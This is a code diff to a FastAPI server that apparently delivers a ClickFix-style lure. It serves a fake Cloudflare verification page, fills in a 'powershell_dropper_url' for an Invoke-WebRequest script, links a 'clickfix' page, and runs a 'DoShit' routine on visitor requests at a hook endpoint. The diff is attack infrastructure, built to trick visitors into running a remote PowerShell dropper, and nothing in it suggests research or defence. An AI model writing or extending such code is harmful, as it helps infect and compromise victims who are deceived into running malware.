@@ -1,5 +1,5 @@
 from fastapi import FastAPI,Request
-from fastapi.responses import FileResponse,HTMLResponse
+from fastapi.responses import FileResponse,HTMLResponse,Response
 from do import DoShit
 import asyncio
 import aiofiles
@@ -22,8 +22,8 @@ async def root_route(req:Request):
     async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
         html = await f.read()
     html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
-    html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page"])
-    #print(html)
+    html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page_endpoint"])
+    print(html)
     return HTMLResponse(
       html  
     )
@@ -31,8 +31,11 @@ async def root_route(req:Request):
 @app.get(f"{config.hookPageEndpoint}")
 async def repair(req:Request):
     await DoShit(req).start("now")
-    return FileResponse(
-        config.conf["PATHS"]["clickfix_page"]
+    async with aiofiles.open(config.conf["PATHS"]["clickfix_page"],"r") as CFX:
+        CFXHtml = await CFX.read()
+    return Response(
+        content=CFXHtml,
+        media_type="text/plain"
     )
 
 
